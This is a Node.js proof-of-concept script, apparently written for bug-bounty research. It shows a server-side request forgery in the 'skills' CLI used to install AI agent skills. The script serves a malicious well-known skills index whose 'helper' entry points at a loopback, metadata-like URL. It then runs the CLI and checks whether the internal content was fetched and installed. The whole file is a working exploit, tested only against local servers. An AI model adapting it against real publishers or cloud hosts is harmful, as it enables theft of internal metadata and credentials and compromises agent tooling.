import http from 'node:http';
import { createHash } from 'node:crypto';
import { spawn } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, writeFile, readdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const INTERNAL_SKILL_BODY = `---
name: leaked-meta
description: Simulated internal service body exfiltrated via unrestricted artifact URL
---

# Internal marker

INTERNAL_ONLY_MARKER=ami-ssrf-c142-local
`;
const DIGEST = `sha256:${createHash('sha256').update(INTERNAL_SKILL_BODY).digest('hex')}`;

function listen(handler) {
  return new Promise((resolve) => {
    const server = http.createServer(handler);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({ server, port, base: `http://127.0.0.1:${port}` });
    });
  });
}

const internalHits = [];
const internal = await listen((req, res) => {
  internalHits.push({ method: req.method, url: req.url, time: new Date().toISOString() });
  res.writeHead(200, { 'content-type': 'text/markdown' });
  res.end(INTERNAL_SKILL_BODY);
});

const publisher = await listen((req, res) => {
  if (req.url === '/.well-known/agent-skills/index.json') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(
      JSON.stringify({
        $schema: 'https://schemas.agentskills.io/discovery/0.2.0/schema.json',
        skills: [
          {
            name: 'helper',
            type: 'skill-md',
            description: 'Looks benign; artifact is absolute loopback IMDS-like URL',
            url: `${internal.base}/latest/meta-data/`,
            digest: DIGEST,
          },
        ],
      })
    );
    return;
  }
  res.writeHead(404);
  res.end();
});

const proj = await mkdtemp(join(tmpdir(), 'c142-skills-'));
console.log('project:', proj);
console.log('publisher:', publisher.base);
console.log('internal:', internal.base);

const args = [
  '-y',
  'skills@1.7.6',
  'add',
  publisher.base,
  '--skill',
  'helper',
  '-a',
  'cursor',
  '-y',
  '--copy',
];

console.log('running: npx', args.join(' '));
const child = spawn('npx', args, {
  cwd: proj,
  env: { ...process.env, CI: '1', FORCE_COLOR: '0' },
  stdio: ['ignore', 'pipe', 'pipe'],
});

let stdout = '';
let stderr = '';
child.stdout.on('data', (d) => {
  stdout += d;
  process.stdout.write(d);
});
child.stderr.on('data', (d) => {
  stderr += d;
  process.stderr.write(d);
});

const code = await new Promise((resolve) => child.on('close', resolve));

// Find installed skill files
async function walk(dir, acc = []) {
  let ents;
  try {
    ents = await readdir(dir, { withFileTypes: true });
  } catch {
    return acc;
  }
  for (const e of ents) {
    const p = join(dir, e.name);
    if (e.isDirectory()) await walk(p, acc);
    else acc.push(p);
  }
  return acc;
}

const files = await walk(proj);
const skillFiles = files.filter((f) => f.includes('SKILL.md') || f.includes('leaked') || f.includes('helper'));
let markerFound = false;
let markerPath = null;
let markerPreview = null;
for (const f of files) {
  if (!f.endsWith('.md') && !f.endsWith('.json')) continue;
  try {
    const t = await readFile(f, 'utf8');
    if (t.includes('INTERNAL_ONLY_MARKER')) {
      markerFound = true;
      markerPath = f;
      markerPreview = t.slice(0, 240);
      break;
    }
  } catch {}
}

const result = {
  exitCode: code,
  internalHits,
  markerFound,
  markerPath,
  markerPreview,
  skillFiles,
  stdoutTail: stdout.slice(-1500),
  stderrTail: stderr.slice(-800),
};

await writeFile(
  '/workspace/bounty-research/poc/r52-skills-wellknown-ssrf/e2e-cli.json',
  JSON.stringify(result, null, 2)
);
console.log('\n=== CLI E2E RESULT ===');
console.log(JSON.stringify(result, null, 2));

await new Promise((r) => publisher.server.close(r));
await new Promise((r) => internal.server.close(r));
await rm(proj, { recursive: true, force: true });
process.exit(markerFound && internalHits.length > 0 ? 0 : 1);
